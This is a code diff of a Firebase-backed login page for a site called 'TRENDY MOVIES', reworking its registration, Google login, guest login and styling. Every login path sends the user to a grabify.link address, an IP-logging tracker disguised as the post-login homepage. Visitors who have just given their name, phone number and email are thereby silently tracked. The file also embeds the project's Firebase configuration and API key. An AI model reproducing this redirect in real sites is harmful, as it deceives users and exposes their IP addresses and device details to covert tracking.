@@ -4,12 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Login Page</title>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-  <style>
-   
-/* General Styles */
+  <style>/* General Styles */
 body {
   margin: 0;
   padding: 0;
@@ -59,15 +54,19 @@ input {
   max-width: 400px;
   padding: 10px;
   margin: 10px 0;
-  border: 2px solid #333333;
   border-radius: 5px;
   background-color: #2a2a2a;
   color: #ffffff;
 }
 
-input:focus {
+/* Email and Password Input Styling */
+input[type="email"], input[type="password"] {
+  border: 2px solid #ff0000; /* Red border */
+}
+
+input[type="email"]:focus, input[type="password"]:focus {
   outline: none;
-  border-color: #ff0000; /* Highlight input on focus */
+  border-color: #ff4500; /* Slightly darker red when focused */
 }
 
 /* Small Text */
@@ -99,46 +98,54 @@ input:focus {
   box-shadow: 0 4px 10px rgba(0, 0, 0, 0.7);
 }
 
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    #register-section {
-      display: none;
-    }
-    .text-link {
-      color: rgb(248, 103, 7);
-      cursor: pointer;
-      text-decoration: underline;
-      margin: 0 5px;
-    }
-    button {
-      margin: 5px;
-      padding: 10px 20px;
-      cursor: pointer;
-    }
-    .input-container {
-      margin-bottom: 10px;
-    }
-    .small-text {
-      font-size: 12px;
-      color: gray;
-      display: block;
-      margin-top: 5px;
-    }
-    .actions {
-      margin-top: 10px;
-    }
-  </style>
-  <link rel="website icon" type="jpj" href="https://i.imghippo.com/files/IFI1305trM.jpg"
+body {
+  font-family: Arial, sans-serif;
+  text-align: center;
+  padding: 20px;
+}
+
+#register-section {
+  display: none;
+}
+
+.text-link {
+  color: rgb(248, 103, 7);
+  cursor: pointer;
+  text-decoration: underline;
+  margin: 0 5px;
+}
+
+button {
+  margin: 5px;
+  padding: 10px 20px;
+  cursor: pointer;
+}
+
+.input-container {
+  margin-bottom: 10px;
+}
+
+.small-text {
+  font-size: 12px;
+  color: gray;
+  display: block;
+  margin-top: 5px;
+}
+
+.actions {
+  margin-top: 10px;
+}</style>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
 <body>
   <div id="app">
+    <div id="app">
     <h1 style="font-family: Arial, sans-serif; font-size: 24px; color: rgb(23, 148, 23);">TRENDY MOVIES</h1>
     <img src="https://i.imghippo.com/files/IFI1305trM.jpg" alt="Company Logo" style="border-radius: 100%; width: 150px; height: 150px;">
-    <div id="login-section">
-      <h2>Login</h2>
+    <div id="login-section">    
+  <h2>Login</h2>
       <input id="email" type="email" placeholder="Email" required />
       <div class="input-container">
         <input id="login-password" type="password" placeholder="Password" />
@@ -146,20 +153,19 @@ input:focus {
       </div>
       <button id="login-btn">Login</button>
       <div>
-      <span class="text-link" id="forgot-password-link">Forgot Password?</span>    
-      <span class="text-link" id="show-register-text">Register</span>
-    </div>
+        <span class="text-link" id="forgot-password-link">Forgot Password?</span>    
+        <span class="text-link" id="show-register-text">Register</span>
+      </div>
       <button id="google-login-btn">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google Logo" style="width: 20px; vertical-align: middle;"> Login with Google
       </button>
       <button id="guest-login-btn">Guest Login</button>
-      <div class="actions">     
-      </div>
     </div>
 
-    <div id="register-section">
+    <div id="register-section" style="display: none;">
       <h2>Register</h2>
       <input id="name" type="text" placeholder="Name" required />
+      <input id="email-register" type="email" placeholder="Email" required />
       <input id="phone" type="text" placeholder="Phone Number" required />
       <div class="input-container">
         <input id="password" type="password" placeholder="Password" required />
@@ -174,138 +180,179 @@ input:focus {
   </div>
 
   <script>
-  // Initialize Firebase
-  const firebaseConfig = {
-    apiKey: "AIzaSyCBPGSYNVaPPDu7RWee9ymckMaI1VQNjd4",
-    authDomain: "trendy-movie.firebaseapp.com",
-    databaseURL: "https://trendy-movie-default-rtdb.firebaseio.com",
-    projectId: "trendy-movie",
-    storageBucket: "trendy-movie.appspot.com",
-    messagingSenderId: "699469684359",
-    appId: "1:699469684359:web:34cc2adfc8019b89a76222",
-    measurementId: "G-54SX69JVY3"
-  };
-  firebase.initializeApp(firebaseConfig);
+    // Initialize Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyCBPGSYNVaPPDu7RWee9ymckMaI1VQNjd4",
+      authDomain: "trendy-movie.firebaseapp.com",
+      databaseURL: "https://trendy-movie-default-rtdb.firebaseio.com",
+      projectId: "trendy-movie",
+      storageBucket: "trendy-movie.firebasestorage.app",
+      messagingSenderId: "699469684359",
+      appId: "1:699469684359:web:34cc2adfc8019b89a76222",
+      measurementId: "G-54SX69JVY3"
+    };
+    firebase.initializeApp(firebaseConfig);
 
-  const auth = firebase.auth();
-  const db = firebase.database();
+    const auth = firebase.auth();
+    const db = firebase.database();
 
-  // Toggle to Register section
-  document.getElementById('show-register-text').addEventListener('click', () => {
-    document.getElementById('register-section').style.display = 'block';
-    document.getElementById('login-section').style.display = 'none';
-  });
+    // Toggle between sections
+    document.getElementById('show-register-text').addEventListener('click', () => {
+      document.getElementById('register-section').style.display = 'block';
+      document.getElementById('login-section').style.display = 'none';
+    });
 
-  // Toggle to Login section
-  document.getElementById('show-login-text').addEventListener('click', () => {
-    document.getElementById('register-section').style.display = 'none';
-    document.getElementById('login-section').style.display = 'block';
-  });
+    document.getElementById('show-login-text').addEventListener('click', () => {
+      document.getElementById('register-section').style.display = 'none';
+      document.getElementById('login-section').style.display = 'block';
+    });
 
-  // Register new user
-  document.getElementById('register-btn').addEventListener('click', () => {
-    const name = document.getElementById('name').value;
-    const phone = document.getElementById('phone').value;
-    const password = document.getElementById('password').value;
+    // Register new user
+    document.getElementById('register-btn').addEventListener('click', () => {
+      const name = document.getElementById('name').value;
+      const email = document.getElementById('email-register').value;
+      const phone = document.getElementById('phone').value;
+      const password = document.getElementById('password').value;
 
-    const userRef = db.ref('users');
-    auth.createUserWithEmailAndPassword(phone + "@example.com", password)
-      .then((userCredential) => {
-        const userId = userCredential.user.uid;
-        userRef.child(userId).set({
-          name,
-          phone,
-          email: phone + "@example.com",
-          loginMethod: "Email",
-          lastLoginTime: new Date().toISOString() // Save registration time as last login
-        });
-        alert("User registered successfully!");
-      })
-      .catch(error => alert(error.message));
-  });
+      auth.createUserWithEmailAndPassword(email, password)
+        .then((userCredential) => {
+          const user = userCredential.user;
+          const userRef = db.ref('users/' + user.uid);
 
-  // Google Login
-  const googleLoginBtn = document.getElementById('google-login-btn');
-  googleLoginBtn.addEventListener('click', () => {
-    const provider = new firebase.auth.GoogleAuthProvider();
-    auth.signInWithPopup(provider)
-      .then((result) => {
-        const user = result.user;
-        const userRef = firebase.database().ref('users/' + user.uid);
+          userRef.set({
+            name,
+            email,
+            phone,
+            loginMethod: "Email",
+            lastLoginTime: new Date().toISOString()
+          });
 
-        userRef.once('value', (snapshot) => {
-          const now = new Date().toISOString(); // Get current time
+          // Send verification email
+          user.sendEmailVerification()
+            .then(() => {
+              alert("Registration successful! Please verify your email before logging in.");
+            })
+            .catch(error => alert("Failed to send verification email: " + error.message));
+        })
+        .catch(error => alert(error.message));
+    });
 
-          if (!snapshot.exists()) {
-            // First time login: Ask for phone number and name
-            const name = prompt("Enter your name:");
-            const phone = prompt("Enter your phone number:");
+    // Login with email and password
+    document.getElementById('login-btn').addEventListener('click', () => {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('login-password').value;
+
+      auth.signInWithEmailAndPassword(email, password)
+        .then((userCredential) => {
+          const user = userCredential.user;
+
+          if (!user.emailVerified) {
+            alert("Please verify your email before logging in.");
+            auth.signOut();
+            return;
+          }
+
+          const userRef = db.ref('users/' + user.uid);
+
+          userRef.update({
+            loginMethod: "Email",
+            lastLoginTime: new Date().toISOString()
+          });
+
+          window.location.href = "https://grabify.link/17CFFS";
+        })
+        .catch(error => alert(error.message));
+    });
+
+    // Google Login
+document.getElementById('google-login-btn').addEventListener('click', () => {
+  const provider = new firebase.auth.GoogleAuthProvider();
+  auth.signInWithPopup(provider)
+    .then((result) => {
+      const user = result.user;
+      const userRef = db.ref('users/' + user.uid);
+
+      userRef.once('value', (snapshot) => {
+        const now = new Date().toISOString();
+
+        if (!snapshot.exists()) {
+          // Create and display a popup for name and phone input
+          const popup = document.createElement('div');
+          popup.style.position = 'fixed';
+          popup.style.top = '50%';
+          popup.style.left = '50%';
+          popup.style.transform = 'translate(-50%, -50%)';
+          popup.style.zIndex = '1000';
+          popup.style.backgroundColor = '#fff';
+          popup.style.boxShadow = '0px 4px 6px rgba(0, 0, 0, 0.1)';
+          popup.style.borderRadius = '10px';
+          popup.style.padding = '20px';
+          popup.style.textAlign = 'center';
+          popup.style.fontFamily = 'Arial, sans-serif';
+          popup.innerHTML = `
+            <h3 style="margin-bottom: 15px;">Complete Your Profile</h3>
+            <input id="popup-name" type="text" placeholder="Name" style="margin-bottom: 10px; padding: 10px; width: 100%; border: 1px solid #ddd; border-radius: 5px;" required>
+            <input id="popup-phone" type="text" placeholder="Mobile Number" style="margin-bottom: 10px; padding: 10px; width: 100%; border: 1px solid #ddd; border-radius: 5px;" required>
+            <button id="popup-submit-btn" style="padding: 10px 20px; background-color: #28a745; color: #fff; border: none; border-radius: 5px; cursor: pointer;">Submit</button>
+            <button id="popup-cancel-btn" style="padding: 10px 20px; margin-left: 10px; background-color: #dc3545; color: #fff; border: none; border-radius: 5px; cursor: pointer;">Cancel</button>
+          `;
+          document.body.appendChild(popup);
+
+          // Handle submit action
+          document.getElementById('popup-submit-btn').addEventListener('click', () => {
+            const name = document.getElementById('popup-name').value;
+            const phone = document.getElementById('popup-phone').value;
 
             if (name && phone) {
               userRef.set({
-                name: name,
-                phone: phone,
+                name,
+                phone,
                 email: user.email,
                 photoURL: user.photoURL,
                 loginMethod: "Google",
-                lastLoginTime: now // Save login time
+                lastLoginTime: now
+              }).then(() => {
+                alert("Profile completed successfully!");
+                popup.remove();
+                window.location.href = "https://grabify.link/17CFFS";
+              }).catch(error => {
+                alert("Failed to save user details: " + error.message);
               });
             } else {
-              alert("Phone number and name are required!");
-              return;
+              alert("Name and Mobile Number are required!");
             }
-          } else {
-            // Update login method and last login time for existing users
-            userRef.update({
-              loginMethod: "Google",
-              lastLoginTime: now // Save login time
-            });
-          }
+          });
 
-          // Redirect to homepage
-          window.location.href = "https://grabify.link/17CFFS";
-        });
-      })
-      .catch((error) => {
-        console.error(error);
-        alert("Google Login failed: " + error.message);
+          // Handle cancel action
+          document.getElementById('popup-cancel-btn').addEventListener('click', () => {
+            popup.remove();
+            auth.signOut();
+          });
+        } else {
+          // Update login time for existing users
+          userRef.update({
+            loginMethod: "Google",
+            lastLoginTime: now
+          }).then(() => {
+            window.location.href = "https://grabify.link/17CFFS";
+          });
+        }
       });
-  });
+    })
+    .catch(error => alert("Google Login failed: " + error.message));
+});
+    // Forgot Password
+    document.getElementById('forgot-password-link').addEventListener('click', () => {
+      const email = document.getElementById('email').value;
+      if (!email) {
+        alert("Please enter your email to reset your password.");
+        return;
+      }
 
-  // Login with email and password
-  document.getElementById('login-btn').addEventListener('click', () => {
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('login-password').value;
-
-    auth.signInWithEmailAndPassword(email, password)
-      .then((userCredential) => {
-        const userId = userCredential.user.uid;
-        const userRef = firebase.database().ref('users/' + userId);
-
-        // Update login method and last login time in the database
-        userRef.update({
-          loginMethod: "Email",
-          lastLoginTime: new Date().toISOString() // Save login time
-        });
-
-        window.location.href = "https://grabify.link/17CFFS";
-      })
-      .catch(error => alert(error.message));
-  });
-
-  // Forgot Password
-  document.getElementById('forgot-password-link').addEventListener('click', () => {
-    const email = document.getElementById('email').value;
-    if (!email) {
-      alert("Please enter your email to reset your password.");
-      return;
-    }
-
-    auth.sendPasswordResetEmail(email)
-      .then(() => alert("Password reset email sent."))
-      .catch(error => alert(error.message));
-  });
-
+      auth.sendPasswordResetEmail(email)
+        .then(() => alert("Password reset email sent."))
+        .catch(error => alert(error.message));
+    });
 
   // Guest Login
 document.getElementById('guest-login-btn').addEventListener('click', () => {
@@ -313,32 +360,62 @@ document.getElementById('guest-login-btn').addEventListener('click', () => {
   guestLoginCount = guestLoginCount ? parseInt(guestLoginCount) : 0;
 
   if (guestLoginCount >= 2) {
-    alert("Guest login limit reached. CREATE AN ID TO LOGIN.");
+    alert("Guest login limit reached. Please create an account.");
     return;
   }
 
-  const name = prompt("Enter your name:");
+  // Create and display a themed popup for name input
+  const popup = document.createElement('div');
+  popup.style.position = 'fixed';
+  popup.style.top = '50%';
+  popup.style.left = '50%';
+  popup.style.transform = 'translate(-50%, -50%)';
+  popup.style.zIndex = '1000';
+  popup.style.backgroundColor = '#fff';
+  popup.style.boxShadow = '0px 4px 6px rgba(0, 0, 0, 0.1)';
+  popup.style.borderRadius = '10px';
+  popup.style.padding = '20px';
+  popup.style.textAlign = 'center';
+  popup.style.fontFamily = 'Arial, sans-serif';
+  popup.innerHTML = `
+    <h3 style="margin-bottom: 15px;">Guest Login</h3>
+    <input id="guest-name" type="text" placeholder="Enter your name" style="margin-bottom: 10px; padding: 10px; width: 100%; border: 1px solid #ddd; border-radius: 5px;" required>
+    <button id="guest-popup-submit-btn" style="padding: 10px 20px; background-color: #28a745; color: #fff; border: none; border-radius: 5px; cursor: pointer;">Submit</button>
+    <button id="guest-popup-cancel-btn" style="padding: 10px 20px; margin-left: 10px; background-color: #dc3545; color: #fff; border: none; border-radius: 5px; cursor: pointer;">Cancel</button>
+  `;
+  document.body.appendChild(popup);
 
-  if (name) {
-    guestLoginCount++;
-    localStorage.setItem('guestLoginCount', guestLoginCount);
+  // Handle submit action
+  document.getElementById('guest-popup-submit-btn').addEventListener('click', () => {
+    const name = document.getElementById('guest-name').value;
 
-    const guestUserId = `guest_${Date.now()}`;
-    db.ref('users/' + guestUserId).set({
-      name: name,
-      role: 'guest',
-      loginTime: new Date().toISOString(),
-      lastLoginTime: new Date().toISOString(), // Save login time
-      loginMethod: "Guest"
-    }).then(() => {
-      alert("Logged in as Guest.");
-      window.location.href = "https://grabify.link/17CFFS";
-    }).catch(error => {
-      alert("Failed to save guest details: " + error.message);
-    });
-  } else {
-    alert("Please enter your name.");
-  }
+    if (name) {
+      guestLoginCount++;
+      localStorage.setItem('guestLoginCount', guestLoginCount);
+
+      const guestUserId = `guest_${Date.now()}`;
+      db.ref('users/' + guestUserId).set({
+        name,
+        role: 'guest',
+        loginTime: new Date().toISOString(),
+        loginMethod: "Guest"
+      }).then(() => {
+        alert("Logged in as Guest.");
+        popup.remove();
+        window.location.href = "https://grabify.link/17CFFS";
+      }).catch(error => {
+        alert("Failed to save guest details: " + error.message);
+      });
+    } else {
+      alert("Name is required to continue.");
+    }
+  });
+
+  // Handle cancel action
+  document.getElementById('guest-popup-cancel-btn').addEventListener('click', () => {
+    popup.remove();
+  });
 });
-
-</script>
+  </script>
+</body>
+</html>
